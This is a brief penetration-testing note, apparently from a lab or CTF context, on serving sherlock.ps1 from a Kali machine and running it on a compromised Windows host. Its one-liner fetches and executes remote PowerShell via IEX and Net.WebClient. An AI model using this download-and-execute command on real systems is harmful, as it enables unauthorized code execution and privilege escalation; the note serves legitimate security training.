# How to download and execute a PS file on Windows machines
## Scenario
Kali attack machine: 10.10.16.18  
We have a user shell on a windows machine.  
We have a PowerShell file on Kali attack box that we want to run: sherlock.ps1  

## Get the file ready
Put it into /root/transfer/  
start HTTP server: *python3 -m http.server 80*  

## Download and run the file on windows machine  
To the user shell  
*echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.18/sherlock.ps1') | powershell -noprofile -*  
